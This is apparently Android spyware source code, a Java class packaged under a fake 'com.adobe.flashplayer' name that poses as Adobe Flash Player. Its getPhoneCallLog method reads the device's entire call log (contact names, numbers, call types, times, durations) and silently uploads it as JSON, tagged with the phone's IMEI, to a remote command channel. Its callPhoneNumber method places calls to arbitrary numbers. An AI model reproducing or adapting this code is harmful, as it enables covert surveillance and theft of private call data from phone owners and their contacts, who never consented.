package com.adobe.flashplayer.data;


import org.json.JSONArray;
import org.json.JSONObject;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUtils;
import com.adobe.flashplayer.network.UploadData;
import com.adobe.flashplayer.Public;



public class PhoneCallLog {

    private static final String TAG = "[ljg]PhoneCallLog";


    public static boolean getPhoneCallLog(Context context)
    {

        try{
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.READ_CALL_LOG);
            if (granted == PackageManager.PERMISSION_GRANTED) {

                JSONArray jsarray = new JSONArray();

                ContentResolver cr = context.getContentResolver();

                Cursor cs = cr.query(CallLog.Calls.CONTENT_URI,
                        new String[]{CallLog.Calls.CACHED_NAME,
                                CallLog.Calls.NUMBER,
                                CallLog.Calls.TYPE,
                                CallLog.Calls.DATE,
                                CallLog.Calls.DURATION
                        }, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);

                int i = 0;
                if (cs != null && cs.getCount() > 0) {
                    for (cs.moveToFirst(); !cs.isAfterLast(); cs.moveToNext()) {
                        String callName = cs.getString(0);
                        String callNumber = cs.getString(1);

                        int callType = Integer.parseInt(cs.getString(2));
                        String callTypeStr = "";
                        switch (callType) {
                            case CallLog.Calls.INCOMING_TYPE:
                                callTypeStr = "呼入";
                                break;
                            case CallLog.Calls.OUTGOING_TYPE:
                                callTypeStr = "呼出";
                                break;
                            case CallLog.Calls.MISSED_TYPE:
                                callTypeStr = "未接";
                                break;

                            case CallLog.Calls.VOICEMAIL_TYPE:
                                callTypeStr = "voiceMail";
                                break;

                            case 10:                //vivo
                                callTypeStr = "未接";
                                break;
                            default:
                                callTypeStr = "未知";
                                break;
                        }

                        String callDateStr = Utils.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(cs.getString(3)));
                        String callDurationStr = cs.getString(4);
                        if (callDurationStr == null) {
                            callDurationStr = "0分0秒";
                        } else {
                            int callDuration = Integer.parseInt(callDurationStr);
                            int min = callDuration / 60;
                            int sec = callDuration % 60;
                            callDurationStr = min + "分" + sec + "秒";
                        }

                        JSONObject jsobj = new JSONObject();
                        jsobj.put("类型", callTypeStr);
                        jsobj.put("姓名", callName);
                        jsobj.put("号码", callNumber);
                        jsobj.put("时间", callDateStr);
                        jsobj.put("时长", callDurationStr);

                        jsarray.put(i, jsobj);

                        i++;
                    }
                    cs.close();
                }

                if (NetworkUtils.isNetworkAvailable(context)) {
                    UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_MESSAGE, Public.IMEI);
                }else{

                }
                return true;
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("UserPhoneCall exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }

        return false;
    }






    public static void callPhoneNumber(Context context,String phoneNumber) {
        try{
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.READ_CALL_LOG);
            if (granted == PackageManager.PERMISSION_GRANTED) {

                Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phoneNumber));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);

                Log.e(TAG, "call phone:" + phoneNumber + " ok");
                MyLog.writeLogFile("call phone:" + phoneNumber + " ok\r\n");
            }
        }
        catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("callPhoneNumber exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }
    }




}

